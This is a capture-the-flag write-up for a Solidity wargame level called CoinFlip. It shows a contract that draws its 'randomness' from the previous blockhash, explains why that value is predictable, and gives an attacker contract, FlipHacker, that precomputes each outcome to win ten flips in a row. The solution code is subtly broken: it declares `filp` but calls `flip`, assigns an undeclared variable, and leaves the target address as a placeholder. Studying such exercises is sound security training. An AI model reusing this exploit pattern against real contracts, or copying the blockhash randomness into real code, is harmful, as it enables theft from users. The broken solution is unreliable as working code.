# **Level 3 -- CoinFlip**
## **Contract to hack**
``` ts
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
`````` 
---
## ***Objectives***
* Guess the correct answer 10 times in a row
---
## ***Thought Process***
It seems like the developer wants to use random number to decide the coin's side. However in Ethereum, the variables may look random but actually deterministic and can be exploited if the inputs are known. We will use this point to hack the contract.

This contract only has one function called `flip()`
``` ts
// This means we can not call this function in the same block more than once 
if (lastHash == blockValue) {
      revert();
    }
```
``` ts
uint256 blockValue = uint256(blockhash(block.number - 1));
lastHash = blockValue;
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```
We can see the coin's side is determined by the last block number & a constant named FACTOR. So we only need to create a contract which has same ways as this contract to caculate coin's side. 

---
## ***Solution***
``` ts
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../instances/Ilevel03.sol";

contract FlipHacker {
  address filp = xxxxxx;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flipHacker() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    CoinFlip(flip).flip(side);
  }
}
```
After deploying `FlipHacker` contract, we just need to call `flipHacker()` function 10 times in different blocks to compelete this level.



